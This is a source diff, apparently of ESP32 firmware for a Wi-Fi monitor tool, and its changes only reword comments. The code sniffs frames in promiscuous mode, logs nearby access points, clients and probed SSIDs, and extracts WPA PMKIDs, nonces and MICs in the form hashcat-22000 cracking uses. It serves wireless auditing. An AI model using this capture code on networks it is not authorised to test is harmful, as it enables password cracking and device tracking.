     if (s_pcap_active && s_pcap_ring && p &&
         pcap_frame_wanted(p->payload, p->rx_ctrl.sig_len, type)) {
-        uint32_t tail = s_pcap_tail;                                    /* sole producer */
+        uint32_t tail = s_pcap_tail;                                    /* the sole producer */
         uint32_t head = __atomic_load_n(&s_pcap_head, __ATOMIC_ACQUIRE);
         if ((tail - head) >= PCAP_SLOTS) {
-            s_pcap_drop++;                                              /* ring full */
+            s_pcap_drop++;                                              /* the ring is full */
         } else {
             pcap_slot_t *slot = &s_pcap_ring[tail & (PCAP_SLOTS - 1)];
             uint16_t len = p->rx_ctrl.sig_len;
@@ -1599,13 +1683,14 @@ static void on_promiscuous(void *buf, wifi_promiscuous_pkt_type_t type)
     }
 }
 
-/* Periodic tick (esp_timer task — off the LVGL task): hop the channel while hopping, and
- * recompute the frame rate over the actual elapsed window (~1 s). */
+/* The periodic tick, running on the esp_timer task off the LVGL task:
+ * hops the channel while hopping is enabled, and recomputes the frame rate
+ * over the actual elapsed window, roughly 1s. */
 static void mon_tick(void *arg)
 {
     (void)arg;
     if (!s_mon_active) {
-        return;                                       /* teardown flipped this; bail */
+        return;                                       /* teardown already flipped this off: bail out */
     }
     if (s_mon_hop) {
         int ch = s_mon_chan + 1;
@@ -1617,11 +1702,11 @@ static void mon_tick(void *arg)
     }
     int64_t now = esp_timer_get_time();
     int64_t dt = now - s_mon_rate_t0;
-    if (dt >= 1000000) {                              /* ~1 s window */
+    if (dt >= 1000000) {                              /* a roughly 1s window */
         uint32_t total = s_mon_total;
         s_mon_rate = (uint32_t)((int64_t)(total - s_mon_rate_base) * 1000000 / dt);
         s_mon_rate_base = total;
-        uint32_t dd = s_mon_deauth + s_mon_disassoc;  /* deauth+disassoc rate over the same window */
+        uint32_t dd = s_mon_deauth + s_mon_disassoc;  /* the deauth+disassoc rate over that same window */
         s_mon_dd_rate = (uint32_t)((int64_t)(dd - s_mon_dd_base) * 1000000 / dt);
         s_mon_dd_base = dd;
         if (s_mon_dd_rate > s_mon_dd_peak) s_mon_dd_peak = s_mon_dd_rate;
@@ -1629,14 +1714,16 @@ static void mon_tick(void *arg)
     }
 }
 
-/* Install capture: drop any STA link (single radio -> free it to hop), set the frame filter +
- * rx callback, enter promiscuous, and start the hop/sample timer. Called on the worker when the
- * STA is already started, or from the STA_START event when the radio had to be powered up first. */
+/* Installs capture: drops any STA link (with only one radio, this frees
+ * it up to hop), sets the frame filter and rx callback, enters promiscuous
+ * mode, and starts the hop/sample timer. Called either from the worker,
+ * when the STA is already started, or from the STA_START event when the
+ * radio had to be powered up first. */
 static void enter_promiscuous(void)
 {
-    s_mon_prev_connected = s_connected;               /* remember what to restore on exit */
+    s_mon_prev_connected = s_connected;               /* remembers what to restore on exit */
 
-    s_want_connect = false;                           /* the disconnect handler must not retry */
+    s_want_connect = false;                           /* the disconnect handler must not retry after this */
     if (s_connected || s_sta_started) {
         esp_wifi_disconnect();
     }
@@ -1682,7 +1769,7 @@ static void enter_promiscuous(void)
         ESP_ERROR_CHECK_WITHOUT_ABORT(esp_timer_create(&ta, &s_mon_timer));
     }
     if (s_mon_timer) {
-        esp_timer_start_periodic(s_mon_timer, 250000);   /* 250 ms channel dwell */
+        esp_timer_start_periodic(s_mon_timer, 250000);   /* a 250ms dwell time per channel */
     }
     s_mon_active = true;
     ESP_LOGI(TAG, "monitor on (mgmt|ctrl|data, %s); int-dma free=%u largest=%u",
@@ -1692,31 +1779,33 @@ static void enter_promiscuous(void)
     refresh_strings();
 }
 
-/* Stop capture but DO NOT restore the STA link (shared by monitor-off and radio-disable). */
+/* Stops capture but does not restore the STA link; shared by monitor-off and radio-disable. */
 static void monitor_teardown(void)
 {
     s_pending_monitor = false;
-    s_parse_active = false;                           /* no capture -> stop parsing (ring/task kept) */
-    do_mgmt_tx_off();                                 /* no capture -> stop any management-frame TX  */
-    do_beacon_off();                                  /* no capture -> stop any beacon TX            */
-    pcap_stop_and_free();                             /* no capture -> stop PCAP + free the writer task */
+    s_parse_active = false;                           /* no capture running: stop parsing too, though the ring/task itself is kept */
+    do_mgmt_tx_off();                                 /* no capture running: stop any management-frame TX too */
+    do_beacon_off();                                  /* no capture running: stop any beacon TX too */
+    pcap_stop_and_free();                             /* no capture running: stop PCAP and free the writer task */
     if (!s_mon_active) {
         return;
     }
     if (s_mon_timer) {
-        esp_timer_stop(s_mon_timer);                  /* no more hops / samples */
+        esp_timer_stop(s_mon_timer);                  /* no more hops or samples */
     }
-    s_mon_active = false;                             /* the tick bails on this */
+    s_mon_active = false;                             /* the tick function bails out on this flag */
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(NULL);
     ESP_LOGI(TAG, "monitor off (captured %u frames)", (unsigned)s_mon_total);
 }
 
-/* ---- passive parser: decode captured management frames into the nearby-AP table (M5-P3) --- */
+/* ---- passive parser: decodes captured management frames into the nearby-AP table (M5-P3) ---- */
 
-/* A small curated OUI -> vendor table (common consumer / infrastructure makers). NOT exhaustive
- * — a best-effort label for the list; unknown OUIs show "" and a randomized MAC shows "random".
- * (An SD-backed full OUI database can replace this later.) First 3 BSSID bytes, big-endian. */
+/* A small, curated OUI-to-vendor table covering common consumer and
+ * infrastructure makers. Not exhaustive — just a best-effort label for the
+ * list; an unknown OUI shows "" and a randomized MAC shows "random". (An
+ * SD-backed full OUI database could replace this later.) Keyed by the first
+ * 3 BSSID bytes, big-endian. */
 static const struct { uint8_t oui[3]; const char *name; } k_oui[] = {
     { {0x24,0x0A,0xC4}, "Espressif" }, { {0x24,0x6F,0x28}, "Espressif" }, { {0x30,0xAE,0xA4}, "Espressif" },
     { {0xA4,0xCF,0x12}, "Espressif" }, { {0x84,0xF3,0xEB}, "Espressif" }, { {0xEC,0xFA,0xBC}, "Espressif" },
@@ -1737,8 +1826,10 @@ static const struct { uint8_t oui[3]; const char *name; } k_oui[] = {
     { {0x00,0x18,0x0A}, "Meraki" },    { {0xE0,0xCB,0xBC}, "Meraki" },
 };
 
-/* Vendor label for a BSSID. A locally-administered address (bit1 of octet 0) is a randomized MAC
- * — flag it as "random" (a useful signal), never a vendor. Writes a NUL-terminated `out`. */
+/* Returns the vendor label for a BSSID. A locally-administered address
+ * (bit 1 of octet 0 set) is a randomized MAC — flagged as "random", which is
+ * itself a useful signal, rather than looked up as a vendor. Writes a
+ * NUL-terminated `out`. */
 static void oui_lookup(const uint8_t bssid[6], char *out, size_t outlen)
 {
     if (bssid[0] & 0x02) { snprintf(out, outlen, "random"); return; }
@@ -1751,26 +1842,28 @@ static void oui_lookup(const uint8_t bssid[6], char *out, size_t outlen)
     out[0] = '\0';
 }
 
-/* Classify an RSN IE body (after tag+len): version(2) group(4) pairwise{cnt(2),list} akm{cnt(2),
- * list} ... Scan the AKM suites for SAE (WPA3) or 802.1X/EAP (enterprise); default WPA2-PSK.
- * Every offset is bounds-checked against `len` (the IE may be truncated by the snaplen). */
+/* Classifies an RSN IE body, after its tag and length: version(2),
+ * group(4), pairwise{cnt(2), list}, akm{cnt(2), list}, ... Scans the AKM
+ * suites for SAE (WPA3) or 802.1X/EAP (enterprise), defaulting to WPA2-PSK.
+ * Every offset is bounds-checked against `len`, since the IE may have been
+ * truncated by the snaplen. */
 static uint8_t classify_rsn(const uint8_t *ie, int len)
 {
-    int off = 2;                                   /* skip version */
+    int off = 2;                                   /* skip the version field */
     if (off + 4 > len) return NOCSIF_WIFI_SEC_WPA2;
-    off += 4;                                      /* group cipher suite */
+    off += 4;                                      /* the group cipher suite */
     if (off + 2 > len) return NOCSIF_WIFI_SEC_WPA2;
-    int pc = ie[off] | (ie[off + 1] << 8);         /* pairwise count */
+    int pc = ie[off] | (ie[off + 1] << 8);         /* the pairwise cipher count */
     off += 2 + pc * 4;
     if (off + 2 > len) return NOCSIF_WIFI_SEC_WPA2;
-    int ac = ie[off] | (ie[off + 1] << 8);         /* AKM count */
+    int ac = ie[off] | (ie[off + 1] << 8);         /* the AKM suite count */
     off += 2;
     bool sae = false, ent = false;
     for (int i = 0; i < ac; i++) {
         if (off + 4 > len) break;
-        if (ie[off] == 0x00 && ie[off + 1] == 0x0F && ie[off + 2] == 0xAC) {   /* 00-0F-AC family */
+        if (ie[off] == 0x00 && ie[off + 1] == 0x0F && ie[off + 2] == 0xAC) {   /* the 00-0F-AC suite family */
             uint8_t t = ie[off + 3];
-            if (t == 8 || t == 9)                                  sae = true;  /* SAE / SAE-FT */
+            if (t == 8 || t == 9)                                  sae = true;  /* SAE or SAE-FT */
             else if (t == 1 || t == 3 || t == 5 || t == 11 || t == 12) ent = true;  /* 802.1X/EAP */
         }
         off += 4;
@@ -1780,9 +1873,11 @@ static uint8_t classify_rsn(const uint8_t *ie, int len)
     return NOCSIF_WIFI_SEC_WPA2;
 }
 
-/* Insert or update one AP in the table (parser task). First-seen order keeps rows stable; when
- * the table is full the stalest entry is evicted. Formatting is done before the lock; the short
- * spinlock only touches the table so the LVGL reader is never blocked long. */
+/* Inserts or updates one AP in the table; runs on the parser task.
+ * First-seen ordering keeps rows stable, and the stalest entry is evicted
+ * once the table is full. Formatting happens before the lock is taken, so
+ * the short spinlock only ever touches the table itself, keeping the LVGL
+ * reader from being blocked for long. */
 static void ap_upsert(const uint8_t bssid[6], const char *ssid, bool hidden,
                       uint8_t channel, int8_t rssi, uint8_t sec, int64_t ts)
 {
@@ -1798,7 +1893,7 @@ static void ap_upsert(const uint8_t bssid[6], const char *ssid, bool hidden,
     if (idx < 0) {
         if (s_mon_ap_cnt < MON_AP_MAX) {
             idx = s_mon_ap_cnt++;
-        } else {                                    /* evict the stalest */
+        } else {                                    /* evict the stalest entry */
             idx = 0;
             int64_t oldest = s_mon_ap[0].last_us;
             for (int i = 1; i < MON_AP_MAX; i++) {
@@ -1813,7 +1908,7 @@ static void ap_upsert(const uint8_t bssid[6], const char *ssid, bool hidden,
         structural = true;
     }
     mon_ap_t *a = &s_mon_ap[idx];
-    if (!hidden && ssid[0]) {                        /* reveal / refresh SSID; keep a known one */
+    if (!hidden && ssid[0]) {                        /* reveal or refresh the SSID, but keep an already-known one */
         size_t k = 0;
         while (ssid[k] && k < sizeof(a->ssid) - 1) { a->ssid[k] = ssid[k]; k++; }
         a->ssid[k] = '\0';
@@ -1828,8 +1923,7 @@ static void ap_upsert(const uint8_t bssid[6], const char *ssid, bool hidden,
     portEXIT_CRITICAL(&s_ap_mux);
 }
 
-/* Insert or update one station in the table (parser task). Same first-seen / stalest-evict shape
- * as ap_upsert; the short spinlock only touches the table. */
+/* Inserts or updates one station in the table; runs on the parser task. Same first-seen/stalest-evict pattern as ap_upsert; the short spinlock only touches the table. */
 static void sta_upsert(const uint8_t mac[6], const uint8_t bssid[6],
                        uint8_t channel, int8_t rssi, int64_t ts)
 {
@@ -1845,7 +1939,7 @@ static void sta_upsert(const uint8_t mac[6], const uint8_t bssid[6],
     if (idx < 0) {
         if (s_mon_sta_cnt < MON_STA_MAX) {
             idx = s_mon_sta_cnt++;
-        } else {                                    /* evict the stalest */
+        } else {                                    /* evict the stalest entry */
             idx = 0;
             int64_t oldest = s_mon_sta[0].last_us;
             for (int i = 1; i < MON_STA_MAX; i++) {
@@ -1869,7 +1963,7 @@ static void sta_upsert(const uint8_t mac[6], const uint8_t bssid[6],
     portEXIT_CRITICAL(&s_ap_mux);
 }
 
-/* Insert or update one probe request, keyed by the (device, requested-SSID) pair. */
+/* Inserts or updates one probe request, keyed by the (device, requested-SSID) pair. */
 static void probe_upsert(const uint8_t mac[6], const char *ssid, int8_t rssi, int64_t ts)
 {
     char vendor[12];
@@ -1885,7 +1979,7 @@ static void probe_upsert(const uint8_t mac[6], const char *ssid, int8_t rssi, in
     if (idx < 0) {
         if (s_mon_probe_cnt < MON_PROBE_MAX) {
             idx = s_mon_probe_cnt++;
-        } else {                                    /* evict the stalest */
+        } else {                                    /* evict the stalest entry */
             idx = 0;
             int64_t oldest = s_mon_probe[0].last_us;
             for (int i = 1; i < MON_PROBE_MAX; i++) {
@@ -1908,40 +2002,43 @@ static void probe_upsert(const uint8_t mac[6], const char *ssid, int8_t rssi, in
     portEXIT_CRITICAL(&s_ap_mux);
 }
 
-/* Map a data frame to a (station, AP) pair from the ToDS/FromDS bits + addresses, and record the
- * station. Only infrastructure frames (exactly one of ToDS/FromDS) resolve an AP; IBSS/WDS are
- * skipped. Group/broadcast senders and the AP's own address are never recorded as a station. */
+/* Maps a data frame to a (station, AP) pair using the ToDS/FromDS bits
+ * and addresses, and records the station. Only infrastructure frames —
+ * exactly one of ToDS/FromDS set — resolve an AP; IBSS/WDS frames are
+ * skipped. Group/broadcast senders and the AP's own address are never
+ * recorded as a station. */
 static void parse_data_frame(const cap_slot_t *s, const uint8_t *d)
 {
-    if (s->cap_len < 24) {                          /* need the 3-address MAC header */
+    if (s->cap_len < 24) {                          /* needs the 3-address MAC header */
         return;
     }
     bool tods   = (d[1] & 0x01) != 0;
     bool fromds = (d[1] & 0x02) != 0;
     const uint8_t *a1 = d + 4, *a2 = d + 10;
     const uint8_t *sta, *bssid;
-    if (tods && !fromds)      { bssid = a1; sta = a2; }   /* station -> AP: addr2 is the client */
-    else if (!tods && fromds) { sta = a1; bssid = a2; }   /* AP -> station: addr1 is the client */
-    else                      { return; }                 /* IBSS / WDS: no infra AP mapping    */
+    if (tods && !fromds)      { bssid = a1; sta = a2; }   /* station to AP: addr2 is the client */
+    else if (!tods && fromds) { sta = a1; bssid = a2; }   /* AP to station: addr1 is the client */
+    else                      { return; }                 /* IBSS/WDS: there's no infrastructure AP to map to */
 
-    if (sta[0] & 0x01)              return;         /* group/broadcast sender — not a station */
+    if (sta[0] & 0x01)              return;         /* a group/broadcast sender isn't a station */
     bool allzero = true;
     for (int i = 0; i < 6; i++) { if (sta[i]) { allzero = false; break; } }
     if (allzero)                   return;
-    if (memcmp(sta, bssid, 6) == 0) return;         /* the AP itself is not a station         */
+    if (memcmp(sta, bssid, 6) == 0) return;         /* the AP itself is never recorded as a station */
 
     sta_upsert(sta, bssid, s->channel, s->rssi, s->ts_us);
 }
 
-/* Decode a probe request (management subtype 4): addr2 is the searching device; the first IE
- * (tag 0) is the SSID it is looking for (empty = a broadcast/wildcard probe). */
+/* Decodes a probe request (management subtype 4): addr2 is the
+ * searching device, and the first IE (tag 0) is the SSID it's looking for
+ * (empty means a broadcast/wildcard probe). */
 static void parse_probe_req(const cap_slot_t *s, const uint8_t *d)
 {
     if (s->cap_len < 24) {
         return;
     }
-    const uint8_t *sa = d + 10;                     /* addr2 = source (the device) */
-    if (sa[0] & 0x01) {                             /* group source shouldn't occur — skip */
+    const uint8_t *sa = d + 10;                     /* addr2 is the source: the device itself */
+    if (sa[0] & 0x01) {                             /* a group source shouldn't occur here: skip it */
         return;
     }
     char ssid[WIFI_SSID_MAX]; ssid[0] = '\0';
@@ -1950,36 +2047,35 @@ static void parse_probe_req(const cap_slot_t *s, const uint8_t *d)
     while (off + 2 <= len) {
         uint8_t tag  = d[off];
         uint8_t tlen = d[off + 1];
-        if (off + 2 + tlen > len) break;            /* truncated by snaplen — stop */
-        if (tag == 0) {                             /* SSID (the first IE) */
+        if (off + 2 + tlen > len) break;            /* truncated by the snaplen: stop */
+        if (tag == 0) {                             /* the SSID, which is the first IE */
             int n = tlen > 32 ? 32 : tlen;
             bool allzero = true;
             for (int i = 0; i < n; i++) { if (d[off + 2 + i]) { allzero = false; break; } }
             if (n > 0 && !allzero) {
-                for (int i = 0; i < n; i++) {        /* sanitize to the font's printable range */
+                for (int i = 0; i < n; i++) {        /* sanitize it to the font's printable character range */
                     uint8_t c = d[off + 2 + i];
                     ssid[i] = (c >= 0x20 && c < 0x7F) ? (char)c : '?';
                 }
                 ssid[n] = '\0';
             }
-            break;                                  /* SSID handled; the rest is rates/etc. */
+            break;                                  /* SSID handled; the rest is rates and similar fields */
         }
         off += 2 + tlen;
     }
     probe_upsert(sa, ssid, s->rssi, s->ts_us);
 }
 
-/* Insert or update one BSSID's key-exchange record (parser task). Same first-seen / stalest-evict
- * shape as ap_upsert; a PMKID, once seen, is kept. */
-/* One decoded EAPOL message, handed to hs_upsert (which merges it into the BSSID's table entry). */
+/* Inserts or updates one BSSID's key-exchange record; runs on the parser task. Same first-seen/stalest-evict pattern as ap_upsert; a PMKID, once seen, is retained. */
+/* One decoded EAPOL message, handed to hs_upsert, which merges it into the BSSID's table entry. */
 typedef struct {
     uint8_t bssid[6];
     uint8_t sta[6];   bool have_sta;
-    uint8_t msg;                              /* 1..4 */
-    bool    have_pmkid;  uint8_t pmkid[16];   /* from message 1 */
-    bool    have_anonce; uint8_t anonce[32];  /* from message 1 */
-    bool    have_mic;    uint8_t mic[16];     /* from message 2 */
-    uint8_t eapol[HS_EAPOL_MAX];              /* message-2 EAPOL frame (MIC zeroed) */
+    uint8_t msg;                              /* 1 through 4 */
+    bool    have_pmkid;  uint8_t pmkid[16];   /* taken from message 1 */
+    bool    have_anonce; uint8_t anonce[32];  /* taken from message 1 */
+    bool    have_mic;    uint8_t mic[16];     /* taken from message 2 */
+    uint8_t eapol[HS_EAPOL_MAX];              /* the message-2 EAPOL frame, MIC zeroed */
     uint8_t eapol_len;
     int8_t  rssi;  int64_t ts;
 } eapol_parsed_t;
@@ -1998,7 +2094,7 @@ static void hs_upsert(const eapol_parsed_t *p)
     if (idx < 0) {
         if (s_mon_hs_cnt < MON_HS_MAX) {
             idx = s_mon_hs_cnt++;
-        } else {                                    /* evict the stalest */
+        } else {                                    /* evict the stalest entry */
             idx = 0;
             int64_t oldest = s_mon_hs[0].last_us;
             for (int i = 1; i < MON_HS_MAX; i++) {
@@ -2006,7 +2102,7 @@ static void hs_upsert(const eapol_parsed_t *p)
             }
         }
         mon_hs_t *n = &s_mon_hs[idx];
-        memset(n, 0, sizeof *n);                     /* fresh BSSID: clear every field */
+        memset(n, 0, sizeof *n);                     /* a fresh BSSID: clear every field */
         n->used = true;
         memcpy(n->bssid, p->bssid, 6);
         structural = true;
@@ -2030,44 +2126,48 @@ static void hs_upsert(const eapol_parsed_t *p)
     portEXIT_CRITICAL(&s_ap_mux);
 }
 
-/* Decode an EAPOL-Key frame (`eo` = the EAPOL header offset within the data frame `d`). Classify
- * which of the 4-way messages it is from the key-info bits; capture the PMKID + ANonce from message
- * 1 and the MIC + raw EAPOL bytes from message 2 (what a hashcat-22000 line needs), keyed by BSSID.
- * All offsets are bounds-checked against cap_len — a frame truncated by the snaplen yields fewer
- * fields. Purely observational.
+/* Decodes an EAPOL-Key frame; `eo` is the EAPOL header's offset within
+ * data frame `d`. Classifies which of the 4-way messages it's from, using
+ * the key-info bits; captures the PMKID and ANonce from message 1, and the
+ * MIC plus raw EAPOL bytes from message 2 — exactly what a hashcat-22000
+ * line needs — keyed by BSSID. Every offset is bounds-checked against
+ * cap_len, so a frame truncated by the snaplen just yields fewer fields.
+ * Purely observational.
  *
- * EAPOL-Key body (from `kf`): descriptor(1) info(2) keylen(2) replay(8) nonce(32) iv(16) rsc(8)
- * reserved(8) mic(16) key-data-len(2) key-data(var) — so nonce is kf+13, MIC kf+77, key-data-len
- * kf+93 for the common 16-byte-MIC AKMs (WPA2-PSK); a longer-MIC AKM just yields fewer fields. */
+ * The EAPOL-Key body, starting at `kf`: descriptor(1), info(2), keylen(2),
+ * replay(8), nonce(32), iv(16), rsc(8), reserved(8), mic(16),
+ * key-data-len(2), key-data(var) — so the nonce sits at kf+13, the MIC at
+ * kf+77, and the key-data-len at kf+93 for the common 16-byte-MIC AKMs
+ * (WPA2-PSK); a longer-MIC AKM just yields fewer fields. */
 static void parse_eapol(const cap_slot_t *s, const uint8_t *d, int eo)
 {
     int len = s->cap_len;
     if (eo + 4 > len)     return;
-    if (d[eo + 1] != 3)   return;                    /* EAPOL packet type 3 = EAPOL-Key */
-    int kf = eo + 4;                                 /* key-frame body starts here      */
+    if (d[eo + 1] != 3)   return;                    /* EAPOL packet type 3 means EAPOL-Key */
+    int kf = eo + 4;                                 /* the key-frame body starts here */
     if (kf + 3 > len)     return;
-    uint16_t info = (uint16_t)((d[kf + 1] << 8) | d[kf + 2]);   /* key info (BE) */
+    uint16_t info = (uint16_t)((d[kf + 1] << 8) | d[kf + 2]);   /* the key info field, big-endian */
     bool ack     = (info & 0x0080) != 0;
     bool mic     = (info & 0x0100) != 0;
     bool secure  = (info & 0x0200) != 0;
     bool install = (info & 0x0040) != 0;
 
     uint8_t msg = 0;
-    if      ( ack && !mic)             msg = 1;      /* AP→STA, carries ANonce (+ maybe PMKID) */
-    else if (!ack &&  mic && !secure)  msg = 2;      /* STA→AP, carries SNonce + MIC           */
-    else if ( ack &&  mic &&  install) msg = 3;      /* AP→STA                                 */
-    else if (!ack &&  mic &&  secure)  msg = 4;      /* STA→AP                                 */
-    if (msg == 0) return;                            /* group-key rekey / unknown — ignore     */
+    if      ( ack && !mic)             msg = 1;      /* AP to STA, carries the ANonce and possibly a PMKID */
+    else if (!ack &&  mic && !secure)  msg = 2;      /* STA to AP, carries the SNonce and MIC */
+    else if ( ack &&  mic &&  install) msg = 3;      /* AP to STA */
+    else if (!ack &&  mic &&  secure)  msg = 4;      /* STA to AP */
+    if (msg == 0) return;                            /* a group-key rekey, or unknown: ignore it */
 
-    /* The AP's address depends on direction: msg1/3 are AP→STA, msg2/4 are STA→AP. */
+    /* The AP's address depends on direction: messages 1/3 are AP to STA, messages 2/4 are STA to AP. */
     bool tods   = (d[1] & 0x01) != 0;
     bool fromds = (d[1] & 0x02) != 0;
     const uint8_t *bssid, *sta;
-    if      (!tods &&  fromds) { bssid = d + 10; sta = d + 4;  }   /* AP→STA: a2=AP, a1=STA */
-    else if ( tods && !fromds) { bssid = d + 4;  sta = d + 10; }   /* STA→AP: a1=AP, a2=STA */
-    else return;                                     /* IBSS/WDS: no infra AP mapping */
+    if      (!tods &&  fromds) { bssid = d + 10; sta = d + 4;  }   /* AP to STA: a2 is the AP, a1 is the STA */
+    else if ( tods && !fromds) { bssid = d + 4;  sta = d + 10; }   /* STA to AP: a1 is the AP, a2 is the STA */
+    else return;                                     /* IBSS/WDS: there's no infrastructure AP to map to */
 
-    static eapol_parsed_t p;                         /* single parser task -> a static is safe + off-stack */
+    static eapol_parsed_t p;                         /* a single parser task, so a static buffer here is safe and keeps it off the stack */
     memset(&p, 0, sizeof p);
     memcpy(p.bssid, bssid, 6);
     memcpy(p.sta, sta, 6);
@@ -2077,22 +2177,22 @@ static void parse_eapol(const cap_slot_t *s, const uint8_t *d, int eo)
     p.ts   = s->ts_us;
 
     if (msg == 1) {
-        if (kf + 45 <= len) {                        /* ANonce = key nonce (kf+13 .. kf+44) */
+        if (kf + 45 <= len) {                        /* the ANonce is the key nonce, at kf+13 through kf+44 */
             memcpy(p.anonce, &d[kf + 13], 32);
             p.have_anonce = true;
         }
-        int kdl_off = kf + 93;                       /* PMKID (if any) in the key data */
+        int kdl_off = kf + 93;                       /* any PMKID present is inside the key data */
         if (kdl_off + 2 <= len) {
             int kdl = (d[kdl_off] << 8) | d[kdl_off + 1];
             int kd  = kdl_off + 2;
             int end = kd + kdl;
             if (end > len) end = len;
             int off = kd;
-            while (off + 2 <= end) {                 /* walk the key-data KDEs */
+            while (off + 2 <= end) {                 /* walks the key-data KDEs */
                 uint8_t t = d[off];
                 uint8_t l = d[off + 1];
                 if (off + 2 + l > end) break;
-                if (t == 0xDD && l >= 0x14 &&        /* vendor KDE, RSN OUI 00-0F-AC, PMKID (type 4) */
+                if (t == 0xDD && l >= 0x14 &&        /* a vendor KDE, RSN OUI 00-0F-AC, PMKID type 4 */
                     d[off+2] == 0x00 && d[off+3] == 0x0F && d[off+4] == 0xAC && d[off+5] == 0x04) {
                     memcpy(p.pmkid, &d[off + 6], 16);
                     p.have_pmkid = true;
@@ -2102,15 +2202,15 @@ static void parse_eapol(const cap_slot_t *s, const uint8_t *d, int eo)
             }
         }
     } else if (msg == 2) {
-        if (kf + 93 <= len) {                        /* MIC (kf+77..92) + the EAPOL frame bytes */
+        if (kf + 93 <= len) {                        /* the MIC (kf+77..92) plus the whole EAPOL frame's bytes */
             memcpy(p.mic, &d[kf + 77], 16);
-            int klen = (d[eo + 2] << 8) | d[eo + 3]; /* EAPOL body length field */
-            int elen = 4 + klen;                     /* whole EAPOL frame (header + body) */
+            int klen = (d[eo + 2] << 8) | d[eo + 3]; /* the EAPOL body length field */
+            int elen = 4 + klen;                     /* the whole EAPOL frame: header plus body */
             if (elen > len - eo)      elen = len - eo;
             if (elen > HS_EAPOL_MAX)  elen = HS_EAPOL_MAX;
-            if (elen >= 81 + 16) {                    /* need room through the MIC field */
+            if (elen >= 81 + 16) {                    /* need enough room to reach through the MIC field */
                 memcpy(p.eapol, &d[eo], elen);
-                memset(&p.eapol[81], 0, 16);          /* zero the MIC field for hc22000 */
+                memset(&p.eapol[81], 0, 16);          /* zero the MIC field, needed for the hc22000 format */
                 p.eapol_len = (uint8_t)elen;
                 p.have_mic  = true;
             }
@@ -2120,10 +2220,11 @@ static void parse_eapol(const cap_slot_t *s, const uint8_t *d, int eo)
     hs_upsert(&p);
 }
 
-/* Decode one captured frame (parser task, off the hot path). Beacon / probe-response management
- * frames identify an AP; probe requests harvest searched-for SSIDs; data frames map stations to
- * their AP. All IE offsets are bounds-checked against cap_len — a frame truncated by the snaplen
- * just yields fewer fields. */
+/* Decodes one captured frame, on the parser task, off the hot path.
+ * Beacon and probe-response management frames identify an AP; probe
+ * requests harvest the SSIDs being searched for; data frames map stations
+ * to their AP. All IE offsets are bounds-checked against cap_len, so a
+ * frame truncated by the snaplen just yields fewer fields. */
 static void parse_frame(const cap_slot_t *s)
 {
     if (s->cap_len < 24) {                          /* need at least a MAC header */
@@ -2133,23 +2234,23 @@ static void parse_frame(const cap_slot_t *s)
     uint8_t ftype = (d[0] >> 2) & 0x3;
     uint8_t fsub  = (d[0] >> 4) & 0xF;
 
-    if (ftype == 2) {                               /* data frame -> station mapping (+ EAPOL) */
+    if (ftype == 2) {                               /* a data frame maps to a station, plus any EAPOL content */
         parse_data_frame(s, d);
-        int eo = eapol_offset(d, s->cap_len);       /* key exchange rides in EAPOL data frames */
+        int eo = eapol_offset(d, s->cap_len);       /* the key exchange rides inside EAPOL data frames */
         if (eo) parse_eapol(s, d, eo);
         return;
     }
-    if (ftype != 0) {                               /* control frames carry no identity here */
+    if (ftype != 0) {                               /* control frames carry no identity information here */
         return;
     }
-    if (fsub == 4) {                                /* management probe request */
+    if (fsub == 4) {                                /* a management probe request */
         parse_probe_req(s, d);
         return;
     }
-    if (fsub != 8 && fsub != 5) {                   /* only beacon(8) / probe-response(5) below */
+    if (fsub != 8 && fsub != 5) {                   /* only beacon (8) or probe-response (5) below */
         return;
     }
-    if (s->cap_len < 36) {                          /* need the fixed params for an AP decode */
+    if (s->cap_len < 36) {                          /* need the fixed parameters for an AP decode */
         return;
     }
     const uint8_t *bssid = d + 16;                  /* addr3 */
@@ -2163,19 +2264,19 @@ static void parse_frame(const cap_slot_t *s)
     bool    have_rsn = false, have_wpa = false;
 
     int len = s->cap_len;
-    int off = 36;                                   /* first tagged IE (after the fixed params) */
+    int off = 36;                                   /* the first tagged IE, right after the fixed parameters */
     while (off + 2 <= len) {
         uint8_t tag  = d[off];
         uint8_t tlen = d[off + 1];
-        if (off + 2 + tlen > len) break;            /* truncated by snaplen — stop */
+        if (off + 2 + tlen > len) break;            /* truncated by the snaplen: stop */
         const uint8_t *v = d + off + 2;
-        if (tag == 0) {                             /* SSID */
+        if (tag == 0) {                             /* the SSID */
             if (tlen > 0) {
                 bool allzero = true;
                 for (int i = 0; i < tlen; i++) { if (v[i]) { allzero = false; break; } }
                 if (!allzero) {
                     int n = tlen > 32 ? 32 : tlen;
-                    for (int i = 0; i < n; i++) {   /* sanitize to the font's printable range */
+                    for (int i = 0; i < n; i++) {   /* sanitize it to the font's printable character range */
                         uint8_t c = v[i];
                         ssid[i] = (c >= 0x20 && c < 0x7F) ? (char)c : '?';
                     }
@@ -2183,12 +2284,12 @@ static void parse_frame(const cap_slot_t *s)
                     hidden = false;
                 }
             }
-        } else if (tag == 3) {                       /* DS parameter set: home channel */
+        } else if (tag == 3) {                       /* the DS parameter set: the AP's home channel */
             if (tlen >= 1 && v[0] >= 1 && v[0] <= 14) channel = v[0];
         } else if (tag == 48) {                      /* RSN */
             have_rsn = true;
             sec = classify_rsn(v, tlen);
-        } else if (tag == 221 && tlen >= 4 &&        /* vendor: WPA (00-50-F2 type 1) */
+        } else if (tag == 221 && tlen >= 4 &&        /* vendor IE: WPA, 00-50-F2 type 1 */
                    v[0] == 0x00 && v[1] == 0x50 && v[2] == 0xF2 && v[3] == 0x01) {
             have_wpa = true;
         }
@@ -2199,8 +2300,10 @@ static void parse_frame(const cap_slot_t *s)
     ap_upsert(bssid, ssid, hidden, channel, s->rssi, sec, s->ts_us);
 }
 
-/* Parser drain task (single consumer): decode every published slot, then release the head. Idles
- * on a short poll when the ring is empty or parsing is off (kept simple — no notify from the cb). */
+/* The parser's drain task, a single consumer: decodes every published
+ * slot and then releases the head. Idles on a short poll whenever the ring
+ * is empty or parsing is off — kept simple, with no notification from the
+ * callback. */
 static void wifi_parse_task(void *arg)
 {
     (void)arg;
@@ -2209,10 +2312,10 @@ static void wifi_parse_task(void *arg)
             vTaskDelay(pdMS_TO_TICKS(100));
             continue;
         }
-        uint32_t head = s_ring_head;                       /* sole consumer */
+        uint32_t head = s_ring_head;                       /* the sole consumer */
         uint32_t tail = __atomic_load_n(&s_ring_tail, __ATOMIC_ACQUIRE);
         if (head == tail) {
-            vTaskDelay(pdMS_TO_TICKS(20));                  /* idle poll */
+            vTaskDelay(pdMS_TO_TICKS(20));                  /* an idle poll */
             continue;
         }
         while (head != tail) {
